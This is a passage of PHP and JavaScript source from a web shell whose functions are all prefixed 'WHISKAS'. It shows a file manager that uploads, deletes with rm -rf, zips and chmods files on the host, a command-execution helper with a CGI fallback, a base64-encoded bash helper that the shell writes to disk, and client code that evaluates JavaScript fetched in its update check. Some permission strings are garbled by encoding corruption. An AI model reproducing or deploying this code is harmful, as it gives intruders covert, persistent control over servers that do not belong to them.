p="move"==t||"copy"==t?r+l:l;if("modify"==t){var f="tr_row_"+e.getAttribute("fid").replace("id_","");p=d.querySelector("#"+f+" .main_modify").innerText}d.querySelector(".cl-popup-fixed").style.display="block",d.querySelector("#shortcutMenu-holder .popup-head").innerHTML=o,d.querySelector("#shortcutMenu-holder .old-path-lbl").innerHTML=a,d.querySelector("#shortcutMenu-holder .new-filename-lbl").innerHTML=i,d.querySelector("#shortcutMenu-holder .popup-foot > button[name=accept]").innerHTML=o,d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=r+l,d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value=p,d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("fid",e.getAttribute("fid")),d.querySelector("#shortcutMenu-holder button[name=accept]").setAttribute("action",t)}function calcperm(){var e=event.srcElement;autoCheckPerms(e.checked,e.name.substr(0,1))}function autoCheckPerms(e,t,a){if(void 0!==a)for(var i in a){var l=a[i];d.querySelector("#shortcutMenu-holder > form input[name="+l+"r]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"w]").checked=!1,d.querySelector("#shortcutMenu-holder > form input[name="+l+"x]").checked=!1}var r=d.querySelector("#shortcutMenu-holder > form input[name="+t+"r]"),o=d.querySelector("#shortcutMenu-holder > form input[name="+t+"w]"),n=d.querySelector("#shortcutMenu-holder > form input[name="+t+"x]");if("boolean"!=typeof e)"7"==e?(r.checked=!0,o.checked=!0,n.checked=!0):"4"==e?r.checked=!0:"2"==e?o.checked=!0:"1"==e?n.checked=!0:"6"==e?(r.checked=!0,o.checked=!0):"3"==e?(o.checked=!0,n.checked=!0):"5"==e&&(r.checked=!0,n.checked=!0);else{var s=0;r.checked&&(s+=4),o.checked&&(s+=2),n.checked&&(s+=1),"u"==t?d.querySelector("#shortcutMenu-holder > form input[name=u]").value=s:"g"==t?d.querySelector("#shortcutMenu-holder > form input[name=g]").value=s:"w"==t&&(d.querySelector("#shortcutMenu-holder > form input[name=w]").value=s)}}function gg(e,t,a,i,l,r){var o="filesman_holder_"+WHISKAS_current_fm_id;WHISKASloader(o,"block"),data="a="+WHISKASb64(e)+"&c="+WHISKASb64(t)+"&WHISKAS1="+WHISKASb64(a)+"&WHISKAS2="+WHISKASb64(i)+"&WHISKAS3="+WHISKASb64(l)+"&ajax="+WHISKASb64("true"),_Ajax(d.URL,data,r,!1,o)}function WHISKASPopUpDoAction(e){var t=e.getAttribute("action");switch(t){case"rename":case"move":case"copy":var a=e.getAttribute("fid").replace("id_",""),i=$("id_"+a).getAttribute("fname"),l=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value;l=l.trim(),i=i.trim(),gg("doActions",c_,i,l,t,function(e,i){if("rename"==t)if("done"==e){var r=$("id_"+a);updateFileEditor(a,l);var o=r.getAttribute("path")+$("id_"+a).getAttribute("fname");d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML=o,r.addEventListener("animationend",function(){r.classList.remove("textEffect")}),r.classList.add("textEffect"),WHISKASShowNotification("Renamed...","Rename Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else WHISKASShowNotification("error...!","Rename Action","error");WHISKASloader(i,"none")});break;case"permission":var r=d.querySelector("#shortcutMenu-holder > form input[name=u]").value,o=d.querySelector("#shortcutMenu-holder > form input[name=g]").value,n=d.querySelector("#shortcutMenu-holder > form input[name=w]").value;i=(i=d.querySelector("#shortcutMenu-holder > form > .old-path-content").innerHTML).trim();var s=r.trim()+o.trim()+n.trim();gg("doActions",c_,i,s,t,function(e,t){WHISKASloader(t,"none"),WHISKASShowNotification(e,"Permission Action"),d.querySelector(".cl-popup-fixed").style.display="none"});break;case"modify":a=e.getAttribute("fid").replace("id_","");var c=d.querySelector("#shortcutMenu-holder > form > input[name=fname]").value,u=$("id_"+a).getAttribute("fname");gg("doActions",c_,c,u,t,function(t,a){if("ok"==t){var i="tr_row_"+e.getAttribute("fid").replace("id_","");d.querySelector("#"+i+" .main_modify").innerHTML=c,WHISKASShowNotification("success...","Modify Action"),d.querySelector(".cl-popup-fixed").style.display="none"}else WHISKASShowNotification(t,"Modify Action","error");WHISKASloader(a,"none")})}}function WHISKASInitSoratableTab(e){Sortable.create(e,{direction:"horizontal",animation:300,ghostClass:"sortable-ghost",filter:".not-sortable"})}$("search-input").addEventListener("keydown",function(e){setTimeout(function(){var e=$("search-input").value;for(var t in d.getElementsByClassName("history-list")[0].innerHTML="",editor_files)if(-1!=editor_files[t].file.search(e)||""==e){var a=0;t==editor_current_file&&(a=" is_active"),insertToHistory(t,editor_files[t].file,a,editor_files[t].type)}},100)},!1),_Ajax(d.URL,"a="+WHISKASb64("checkupdate"),function(e){if(0!=e.length&&"[]"!=e){var t=JSON.parse(e);if(t.hasOwnProperty("content")){d.body.insertAdjacentHTML("beforeend",t.content);try{evalJS(t.content)}catch(t){}}if(t.hasOwnProperty("copyright")&&($("WHISKAS-copyright").innerHTML=t.copyright),t.hasOwnProperty("solevisible")&&($("WHISKAS_solevisible").innerHTML=t.solevisible),t.hasOwnProperty("code_name")&&($("hidden_sh").innerHTML=t.code_name.replace(/\{version\}/g,t.version_number)),t.hasOwnProperty("market")){var a=d.querySelector("span.WHISKAS_plus");if(t.market.hasOwnProperty("visible")&&"yes"==t.market.visible&&($("menu_opt_market").style.display="inline"),"open"!=t.market.status&&(a.style.color="#ffc107"),t.market.hasOwnProperty("content"))try{evalJS(t.market.content)}catch(t){}}}}),<?php echo $GLOBALS["need_to_update_header"]; ?>?_Ajax(d.URL,"a="+WHISKASb64("updateheader"),function(e){try{var t=JSON.parse(e);for(var a in t){for(var i="",l=0;l<t[a].length;l++)i+="useful"==a||"downloader"==a?'<span class="header_values" style="margin-left: 4px;">'+t[a][l]+"</span>":t[a][l];var r=$("header_"+a);r&&(r.innerHTML=i)}$("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on")}catch(e){}}):islinux&&_Ajax(d.URL,"a="+WHISKASb64("checkcgi"),function(e){"ok"==e&&($("header_cgishell").innerHTML="ON",$("header_cgishell").setAttribute("class","header_on"))}),function(){d.onclick=function(){can_hashchange_work=!1,setTimeout(function(){can_hashchange_work=!0},600)},window.onhashchange=function(e){can_hashchange_work&&WHISKASCheckUrlHash()},WHISKASCheckUrlHash(),WHISKASgetFlags(),rightclick_menu_context=$("rightclick_menu").style,WHISKASInitCwdContext(),document.addEventListener("click",function(e){rightclick_menu_context.opacity="0",setTimeout(function(){rightclick_menu_context.visibility="hidden"},501)},!1);/* Sortable disabled for performance */}();
</script>
</body>
</html>
<?php
}}
if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) {
function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) {
function posix_getgrgid($p) {return false;} }
function WHISKASWhich($p) {
$path = WHISKASEx('which ' . $p,false,false);
if(!empty($path))
return strlen($path);
return false;
}
function WHISKASSize($s) {
if($s >= 1073741824)
return sprintf('%1.2f', $s / 1073741824 ). ' GB';
elseif($s >= 1048576)
return sprintf('%1.2f', $s / 1048576 ) . ' MB';
elseif($s >= 1024)
return sprintf('%1.2f', $s / 1024 ) . ' KB';
else
return $s . ' B';
}
function WHISKASPerms($p) {
if (($p & 0xC000) == 0xC000)$i = 'sÃ¢â‚¬â€¹';
elseif (($p & 0xA000) == 0xA000)$i = 'lÃ¢â‚¬â€¹';
elseif (($p & 0x8000) == 0x8000)$i = '-Ã¢â‚¬â€¹';
elseif (($p & 0x6000) == 0x6000)$i = 'bÃ¢â‚¬â€¹';
elseif (($p & 0x4000) == 0x4000)$i = 'dÃ¢â‚¬â€¹';
elseif (($p & 0x2000) == 0x2000)$i = 'cÃ¢â‚¬â€¹';
elseif (($p & 0x1000) == 0x1000)$i = 'pÃ¢â‚¬â€¹';
else $i = 'uÃ¢â‚¬â€¹';
$i .= (($p & 0x0100) ? 'rÃ¢â‚¬â€¹' : '-');
$i .= (($p & 0x0080) ? 'wÃ¢â‚¬â€¹' : '-');
$i .= (($p & 0x0040) ? (($p & 0x0800) ? 'sÃ¢â‚¬â€¹' : 'xÃ¢â‚¬â€¹' ) : (($p & 0x0800) ? 'SÃ¢â‚¬â€¹' : '-'));
$i .= (($p & 0x0020) ? 'rÃ¢â‚¬â€¹' : '-');
$i .= (($p & 0x0010) ? 'wÃ¢â‚¬â€¹' : '-');
$i .= (($p & 0x0008) ? (($p & 0x0400) ? 'sÃ¢â‚¬â€¹' : 'xÃ¢â‚¬â€¹' ) : (($p & 0x0400) ? 'SÃ¢â‚¬â€¹' : '-'));
$i .= (($p & 0x0004) ? 'rÃ¢â‚¬â€¹' : '-');
$i .= (($p & 0x0002) ? 'wÃ¢â‚¬â€¹' : '-');
$i .= (($p & 0x0001) ? (($p & 0x0200) ? 'tÃ¢â‚¬â€¹' : 'xÃ¢â‚¬â€¹' ) : (($p & 0x0200) ? 'TÃ¢â‚¬â€¹' : '-'));
return $i;
}
function WHISKASPermsColor($f,$isbash=false){
$class = "";
$num = "";
$human = "";
if($isbash){
$class = $f["class"];
$num = $f["num"];
$human = $f["human"];
}else{
$num = substr(sprintf('%o', @fileperms($f)),-4);
$human = WHISKASPerms(@fileperms($f));
if(!@is_readable($f))
$class = "main_red_perm";
elseif (!@is_writable($f))
$class = "main_white_perm";
else
$class = "main_green_perm";
}
return '<span style="font-weight:unset;" class="'.$class.'">'.$num.'</span><span style="font-weight:unset;" class="beetween_perms"> >> </span><span style="font-weight:unset;" class="'.$class.'">'.$human.'</span>';
}
if(!function_exists("scandir")) {
function scandir($dir) {
$dh = opendir($dir);
while (false !== ($filename = readdir($dh)))
$files[] = $filename;
return $files;
}
}
function reArrayFiles($file_post){
$file_ary = array();
$file_count = count($file_post['name']);
$file_keys = array_keys($file_post);
for ($i=0; $i<$file_count; $i++) {
foreach ($file_keys as $key) {
$file_ary[$i][$key] = $file_post[$key][$i];
}
}
return $file_ary;
}
function _WHISKAS_can_runCommand($cgi=true,$cache=true){
	if(isset($_COOKIE["WHISKAS_canruncmd"])&&$cache){
		return true;
	}
	if(strlen(WHISKASEx("whoami",false,$cgi))>0){
		$_COOKIE["WHISKAS_canruncmd"] = true;
		return true;
	}
	return false;
}
function _WHISKAS_symlink($target, $link){
	$phpsym = function_exists("symlink");
	if($phpsym){
		@symlink($target, $link);
	}else{
		WHISKASEx("ln -s '".addslashes($target)."' '".addslashes($link)."'");
	}
}
function _WHISKAS_file_exists($file,$cgi=true){
	if(@file_exists($file)){
		return true;
	}else{
		if(strlen(WHISKASEx("ls -la '".addslashes($file)."'",false,$cgi))>0){
			return true;
		}
	}
	return false;
}
function _WHISKAS_file($file,$cgi=true){
	$array = @file($file);
	if(!$array){
		if(strlen(WHISKASEx("id",false,$cgi))>0){
			$data = WHISKASEx('cat "'.addslashes($file).'"',false,$cgi);
			if(strlen($data)>0){
				return explode("\n", $data);
			}else{
				return false;
			}
		}else{
			return false;
		}
	}else{
		return $array;
	}
}
function _WHISKAS_is_writable($file){
	$check = false;
	$check = @is_writable($file);
	if(!$check){
		if(_WHISKAS_can_runCommand()){
			$check = WHISKASEx('[ -w "'.trim(addslashes($file)).'" ] && echo "yes" || echo "no"');
			if($check == "yes"){
				$check = true;
			}else{
				$check = false;
			}
		}
	}
	return $check;
}
function _WHISKAS_is_dir($dir,$mode="-d"){
	$check = false;
	$check = @is_dir($dir);
	if($mode == "-e"){
		$check = @is_file($dir);
	}
	if(!$check){
		if(_WHISKAS_can_runCommand()){
			$check = WHISKASEx('[ "'.trim($mode).'" "'.trim(addslashes($dir)).'" ] && echo "yes" || echo "no"');
			if($check == "yes"){return true;
			}else{
				return false;
			}
		}
	}
	return $check;
}
function _WHISKAS_load_ace_options($base){
	return '<span>Theme: </span><select class="ace-controler ace-theme-selector" base="'.$base.'" onChange="WHISKASAceChangeSetting(this,\'theme\');"><option value="gruvbox" selected>gruvbox</option><option value="ambiance">ambiance</option><option value="chaos">chaos</option><option value="chrome">chrome</option><option value="clouds">clouds</option><option value="clouds_midnight">clouds_midnight</option><option value="cobalt">cobalt</option><option value="crimson_editor">crimson_editor</option><option value="dawn">dawn</option><option value="dracula">dracula</option><option value="dreamweaver">dreamweaver</option><option value="eclipse">eclipse</option><option value="github">github</option><option value="gob">gob</option><option value="terminal">terminal</option><option value="idle_fingers">idle_fingers</option><option value="iplastic">iplastic</option><option value="katzenmilch">katzenmilch</option><option value="kr_theme">kr_theme</option><option value="kuroir">kuroir</option><option value="merbivore">merbivore</option><option value="merbivore_soft">merbivore_soft</option><option value="mono_industrial">mono_industrial</option><option value="monokai">monokai</option><option value="nord_dark">nord_dark</option><option value="pastel_on_dark">pastel_on_dark</option><option value="solarized_dark">solarized_dark</option><option value="solarized_light">solarized_light</option><option value="sqlserver">sqlserver</option><option value="textmate">textmate</option><option value="tomorrow">tomorrow</option><option value="tomorrow_night">tomorrow_night</option><option value="tomorrow_night_blue">tomorrow_night_blue</option><option value="tomorrow_night_bright">tomorrow_night_bright</option><option value="tomorrow_night_eighties">tomorrow_night_eighties</option><option value="twilight">twilight</option><option value="vibrant_ink">vibrant_ink</option><option value="xcode">xcode</option></select><span>Language: </span><select class="ace-controler" base="'.$base.'" onChange="WHISKASAceChangeSetting(this,\'lang\');"><option value="php">php</option><option value="python">python</option><option value="perl">perl</option><option value="c_cpp">c/c++</option><option value="csharp">c#</option><option value="ruby">ruby</option><option value="html">html</option><option value="javascript">javascript</option><option value="css">css</option><option value="xml">xml</option><option value="sql">sql</option><option value="swift">swift</option><option value="sh">bash</option><option value="lua">lua</option><option value="powershell">powershell</option><option value="jsp">jsp</option><option value="java">java</option><option value="json">json</option><option value="plain_text">plain_text</option></select><span>Soft Wrap: </span><input type="checkbox" name="wrapmode" class="ace-controler" onClick="WHISKASAceChangeWrapMode(this,\''.$base.'\');" checked> | <span>Font Size: </span><button class="ace-controler" style="cursor:pointer;" onclick="WHISKASAceChangeFontSize(\''.$base.'\',\'+\', this);return false;">+</button> | <button style="cursor:pointer;" class="ace-controler" onclick="WHISKASAceChangeFontSize(\''.$base.'\', \'-\', this);return false;">-</button> | ';
}
function WHISKASFilesMan2(){
	WHISKAShead();
	WHISKASNum(8,9,10,7,6,5,4);
	echo '<div style="position:relative;" fm_id="1" id="filesman_holder_1" class="ajaxarea filesman-active-content"><div class="header"></div></div>';
	WHISKASFooter();
}
function copy_paste($c,$s,$d){
if(@is_dir($c.$s)){
@mkdir($d.$s);
$h = @opendir($c.$s);
while (($f = @readdir($h)) !== false)
if (($f != ".") and ($f != ".."))
copy_paste($c.$s.'/',$f, $d.$s.'/');
} elseif(is_file($c.$s))
@copy($c.$s, $d.$s);
}
function WHISKASFilesMan(){
if(!empty ($_COOKIE['WHISKAS_f']))
$_COOKIE['WHISKAS_f'] = @unserialize($_COOKIE['WHISKAS_f']);
if(!empty($_POST['WHISKAS1'])){
switch($_POST['WHISKAS1']){
case 'uploadFile':
$move_cmd_file = false;
$WHISKAS_canruncmd = false;
if($GLOBALS['glob_chdir_false']){
	$WHISKAS_canruncmd = _WHISKAS_can_runCommand(true,true);
	$move_cmd_file = true;
}
if(_WHISKAS_is_writable($GLOBALS['cwd'])){
$files = reArrayFiles($_FILES['f']);
$ret_files = array();
foreach($files as $file){
if($move_cmd_file&&$WHISKAS_canruncmd){
	WHISKASEx("cat '".addslashes($file['tmp_name'])."' > '".addslashes($_POST["c"]."/".$file['name'])."'");
}else{
	if(@move_uploaded_file($file['tmp_name'],$file['name'])){
		$ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($file['name'])):array("name" => "????");
		$gr = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($file['name'])):array("name" => "????");
		$file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($file['name']):"????");
		$file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($file['name']):"????");
		$file_modify = @date('Y-m-d H:i:s', @filemtime($file['name']));
		$file_perm = WHISKASPermsColor($file['name']);
		$file_size = @filesize($file['name']);
		$ret_files[] = array("name" => $file['name'], "size" => WHISKASSize($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group);
	}
}
}
if(!$move_cmd_file){
	echo json_encode($ret_files);
}
}else{
	echo "noperm";
	return;
}
if(!$move_cmd_file){
return;
}
break;
case 'mkdir':
$new_dir_cmd = false;
if($GLOBALS['glob_chdir_false']){
	if(_WHISKAS_can_runCommand(true,true)){
		if(_WHISKAS_is_writable($GLOBALS['cwd'])){
			if(!_WHISKAS_is_dir(trim($_POST['WHISKAS2']))){
				WHISKASEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['WHISKAS2']))."'");
				echo "<script>WHISKASShowNotification('".addslashes($_POST['WHISKAS2'])." created...', 'Files manager');</script>";
			}else{
				echo "<script>WHISKASShowNotification('folder already existed', 'Files manager', 'error');</script>";
			}
		}else{
			echo "<script>WHISKASShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
		}
	}else{
		echo "<script>WHISKASShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
	}
}else{
	if(_WHISKAS_is_writable($GLOBALS['cwd'])){
		if(!_WHISKAS_is_dir(trim($_POST['WHISKAS2']))){
			if(!@mkdir(trim($_POST['WHISKAS2']))){
				echo "<script>WHISKASShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
			}else{
				echo "<script>WHISKASShowNotification('".addslashes($_POST['WHISKAS2'])." created...', 'Files manager');</script>";
			}
		}else{
			echo "<script>WHISKASShowNotification('folder already existed', 'Files manager', 'error');</script>";
		}
	}else{
		echo "<script>WHISKASShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
	}
}
break;
case 'delete':
function deleteDir($path){
$path = (substr($path,-1)=='/') ? $path:$path.'/';
$dh = @opendir($path);
while(($item = @readdir($dh)) !== false){
$item = $path.$item;
if((basename($item) == "..") || (basename($item) == "."))
continue;
$type = @filetype($item);
if ($type == "dir")
deleteDir($item);
else
@unlink($item);
}
@closedir($dh);
@rmdir($path);
}
if(is_array(@$_POST['f']))
foreach($_POST['f'] as $f){
if($f == '..')
continue;
$f = rawurldecode($f);
if($GLOBALS["glob_chdir_false"]){
	if(_WHISKAS_can_runCommand(true,true)){
		WHISKASEx("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
	}
}else{
WHISKASEx("rm -rf '".addslashes($f)."'",false,false);
if(@is_dir($f))
deleteDir($f);
else
@unlink($f);
}
}
if(@is_dir(rawurldecode(@$_POST['WHISKAS2']))&&rawurldecode(@$_POST['WHISKAS2'])!='..'){
deleteDir(rawurldecode(@$_POST['WHISKAS2']));
WHISKASEx("rm -rf '".addslashes($_POST['WHISKAS2'])."'",false,false);
}else{
@unlink(rawurldecode(@$_POST['WHISKAS2']));
}
if($GLOBALS["glob_chdir_false"]){
	$source = rawurldecode(@$_POST['WHISKAS2']);
	if($source!='..'&&!empty($source)){
		if(_WHISKAS_can_runCommand(true,true)){
			WHISKASEx("cd '".trim(addslashes($_POST['c']))."';rm -rf '".addslashes($source)."'");
		}
	}
}
if(is_array($_POST['f']))
return;
break;
case 'paste':
if($_COOKIE['WHISKAS_act'] == 'copy'&&isset($_COOKIE['WHISKAS_f'])){
foreach($_COOKIE['WHISKAS_f'] as $f)
copy_paste($_COOKIE['WHISKAS_c'],$f, $GLOBALS['cwd']);
}elseif($_COOKIE['WHISKAS_act'] == 'move'&&isset($_COOKIE['WHISKAS_f'])){
function move_paste($c,$s,$d){
if(@is_dir($c.$s)){
@mkdir($d.$s);
$h = @opendir($c.$s);
while (($f = @readdir($h)) !== false)
if(($f != ".") and ($f != ".."))
copy_paste($c.$s.'/',$f, $d.$s.'/');
}elseif(@is_file($c.$s))
@copy($c.$s, $d.$s);
}
foreach($_COOKIE['WHISKAS_f'] as $f)
@rename($_COOKIE['WHISKAS_c'].$f, $GLOBALS['cwd'].$f);
}elseif($_COOKIE['WHISKAS_act'] == 'zip'&&isset($_COOKIE['WHISKAS_f'])){
if(class_exists('ZipArchive')){
$zip = new ZipArchive();
$zipX = "WHISKAS_".rand(1,1000).".zip";
if($zip->open($zipX, 1)){
@chdir($_COOKIE['WHISKAS_c']);
foreach($_COOKIE['WHISKAS_f'] as $f){
if($f == '..')continue;
if(@is_file($_COOKIE['WHISKAS_c'].$f))
$zip->addFile($_COOKIE['WHISKAS_c'].$f, $f);
elseif(@is_dir($_COOKIE['WHISKAS_c'].$f)){
$iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/'));
foreach($iterator as $key=>$value){
$key = str_replace('\\','/',realpath($key));
if(@is_dir($key)){
if(in_array(substr($key, strrpos($key,'/')+1),array('.', '..')))continue;
}else{$zip->addFile($key,$key);}}}}
@chdir($GLOBALS['cwd']);
$zip->close();
__alert('>> '.$zipX.' << is created...');}}
}elseif($_COOKIE['WHISKAS_act'] == 'unzip'&&isset($_COOKIE['WHISKAS_f'])){
if(class_exists('ZipArchive')){
$zip = new ZipArchive();
foreach($_COOKIE['WHISKAS_f'] as $f) {
if($zip->open($_COOKIE['WHISKAS_c'].$f)){
$zip->extractTo($_COOKIE['WHISKAS_cwd']);
$zip->close();}}}}
unset($_COOKIE['WHISKAS_f']);
break;
default:
if(!empty($_POST['WHISKAS1'])){
if(in_array($_POST['WHISKAS1'], array("copy", "move", "zip", "unzip"))){
__WHISKAS_set_cookie('WHISKAS_act', @$_POST['WHISKAS1']);
__WHISKAS_set_cookie('WHISKAS_f', @serialize($_POST['f']));
__WHISKAS_set_cookie('WHISKAS_c', @$_POST['c']);
return;
}
}
break;
}
}
$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
if(preg_match("#(.*)\/\.\.#", $_POST['c'], $res)){
	$path = explode('/', $res[1]);
	array_pop($path);
	$_POST['c'] = implode('/', $path);
}
$cmd_dir = false;
if($dirContent === false){
	if(_WHISKAS_can_runCommand(true,true)){
		$tmp_getdir_path = @$_COOKIE["WHISKASchdir_bash_path"];
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["WHISKASchdir_bash"])||@!file_exists($tmp_getdir_path."/WHISKAScgiapi/getdir.WHISKAS")){
			$bash = "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
			$tmp_getdir_path = WHISKASWriteTocgiapi("getdir.WHISKAS",$bash);
			__WHISKAS_set_cookie("WHISKASchdir_bash", "true");
			__WHISKAS_set_cookie("WHISKASchdir_bash_path", $tmp_getdir_path);
		}
		$dirContent = WHISKASEx("cd ".$tmp_getdir_path."/WHISKAScgiapi;sh getdir.WHISKAS '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
		$dirContent = json_decode($dirContent, true);
		if(is_array($dirContent)){
			array_pop($dirContent);
			$cmd_dir = true;
		}else{
			$dirContent = false;
		}
	}
}
WHISKAShead();
WHISKASNum(8,9,10,7,6,5,4);
$count_dirContent = @count($dirContent);
if($count_dirContent > 300){
	@$_COOKIE["WHISKAS_limited_files"] = 100;
}
$WHISKAS_sort_by = isset($_COOKIE["WHISKAS_sort_by"]) ? $_COOKIE["WHISKAS_sort_by"] : 'name';
$WHISKAS_limited_files = isset($_COOKIE["WHISKAS_limited_files"]) ? (int)$_COOKIE["WHISKAS_limited_files"] : 0;
$WHISKAS_files_page_number = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 1;
$WHISKAS_filesman_direction = isset($_COOKIE["WHISKAS_filesman_direction"]) ? $_COOKIE["WHISKAS_filesman_direction"] : 'asc';
$files_page_count = 1;
if($WHISKAS_limited_files > 0){
	$files_page_count = ceil($count_dirContent/$WHISKAS_limited_files);
	if($files_page_count > 1){
		$files_page_count++;
	}
}
echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#39FF14;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'WHISKAS_sort_by\');" style="color:#39FF14;"><option value="name" '.($WHISKAS_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($WHISKAS_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($WHISKAS_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'WHISKAS_filesman_direction\')" style="color:#39FF14;"><option value="asc" '.($WHISKAS_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($WHISKAS_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#39FF14;" type="text" name="limited_number" value="'.$WHISKAS_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'WHISKAS_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#39FF14;">'.($count_dirContent-1).'</b></span></div><div class="header">';
if($dirContent == false){
echo '<center><br><span style="font-size:16px;"><span style="color: red; -webkit-text-shadow: 1px 1px 13px;"><strong><b><big>!!! Access Denied !!!</b></big><br><br></strong></div>';
WHISKASFooter();
return;
}
global $sort;
$sort = array('name', 1);
if(isset($_COOKIE["WHISKAS_sort_by"]) && !empty($_COOKIE["WHISKAS_sort_by"])){
	$sort[0] = $_COOKIE["WHISKAS_sort_by"];
}
if(!empty($_POST['WHISKAS1'])) {
if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['WHISKAS1'], $match))
$sort = array($match[1], (int)$match[2]);
}
if($WHISKAS_files_page_number > ($files_page_count-1)){
	$WHISKAS_files_page_number = 1;
}
$checkbox_rand = rand(11111, 99999);
echo "<form onsubmit='fc(this);return false;' name='files' method='post'><table id='filemanager_table' width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk".$checkbox_rand."' onclick='checkBox(this);' class='chkbx'><label for='mchk".$checkbox_rand."'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
$dirs = $files = array();
$n = $count_dirContent;
if($n > $WHISKAS_limited_files && $WHISKAS_limited_files > 0){
	$n = ($WHISKAS_limited_files * $WHISKAS_files_page_number);
	if($n > $count_dirContent){
		$n = $count_dirContent;
	}
}
$i = 0;
if($WHISKAS_limited_files > 0 && $WHISKAS_files_page_number > 1){
	$i = $WHISKAS_limited_files * ($WHISKAS_files_page_number - 1);
}
$page_builder = get_pagination_links($WHISKAS_files_page_number,$files_page_count -1);
$cmd_dir_backp = "";
for(;$i<$n;$i++){
if($cmd_dir){
$filename = $dirContent[$i]["name"];
$file_owner = $dirContent[$i]["owner"];
$file_group = $dirContent[$i]["group"];
$file_modify = @date('Y-m-d H:i:s', $dirContent[$i]["modify"]);
$file_perm = WHISKASPermsColor(array("class"=>$dirContent[$i]["permcolor"],"num"=>$dirContent[$i]["permnum"],"human"=>$dirContent[$i]["permhuman"]),true);
$file_size = $dirContent[$i]["size"];
if(substr($dirContent[$i]["name"], 0 ,1) == "/"){
$file_path = $dirContent[$i]["name"];
$dirContent[$i]["name"] = "..";
$filename = $dirContent[$i]["name"];
}else{
$file_path = $GLOBALS['cwd']."/".$dirContent[$i]["name"];
}
}else{
$filename = $dirContent[$i];
$ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($GLOBALS['cwd'].$filename)):array("name" => "????");
$gr = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($GLOBALS['cwd'].$filename)):array("name" => "????");
$file_owner = $ow['name']?$ow['name']:(function_exists("fileowner")?@fileowner($GLOBALS['cwd'].$filename):"????");
$file_group = $gr['name']?$gr['name']:(function_exists("filegroup")?@filegroup($GLOBALS['cwd'].$filename):"????");
$file_modify = @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $filename));
$file_perm = WHISKASPermsColor($GLOBALS['cwd'].$filename);
$file_size = @filesize($GLOBALS['cwd'].$filename);
$file_path = $GLOBALS['cwd'].$filename;
}
$tmp = array('name' => $filename,
'path' => $file_path,
